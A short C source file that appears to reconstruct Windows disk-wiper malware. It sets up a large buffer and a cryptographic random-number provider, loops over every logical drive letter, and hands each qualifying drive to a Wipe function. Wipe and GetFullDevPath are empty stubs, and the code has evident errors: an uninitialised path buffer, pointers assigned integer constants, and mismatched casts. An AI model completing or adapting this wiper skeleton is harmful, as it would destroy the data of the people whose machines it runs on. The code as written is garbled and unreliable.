#include <Windows.h>
#include <bcrypt.h>

int GetFullDevPath(WCHAR currentDrive);
void Wipe(ULONGLONG driveToWipe);

int main(int argc, char* argv[]) {

	ULONGLONG driveToWipe = 0x41;
	UINT64 currentDrive;
	LPWSTR pathBuf;
	int fullDevPath;
	DWORD* idk;
	char* volumeName;
	UINT64 driveBitmask;
	BCRYPT_ALG_HANDLE cngProvBuf;

	HANDLE hHeap = GetProcessHeap();
	ULONG_PTR heapBuf = HeapAlloc(hHeap, 8, 0x4000000);

	GetWindowsDirectoryW(pathBuf, 260);

	NTSTATUS bCrypt = BCryptOpenAlgorithmProvider(&cngProvBuf, L"RNG", NULL, 0);
	if (bCrypt != 0)
		cngProvBuf = 0;

	driveBitmask = GetLogicalDrives();

	while (driveBitmask != 0 && ((currentDrive = (WCHAR)driveToWipe) < 0x5b)) {
		fullDevPath = GetFullDevPath((WCHAR)currentDrive);
			if (((driveBitmask & 1) != 0) && (fullDevPath == 0)) {
				idk = 0x5c003a;
				volumeName = (WCHAR)currentDrive;
				Wipe(driveToWipe);
		}
			driveBitmask >>= 1;
			driveToWipe = (currentDrive + L'\x01');
	}



	ExitProcess(0);
}

int GetFullDevPath(WCHAR currentDrive) {

}

void Wipe(ULONGLONG driveToWipe) {

}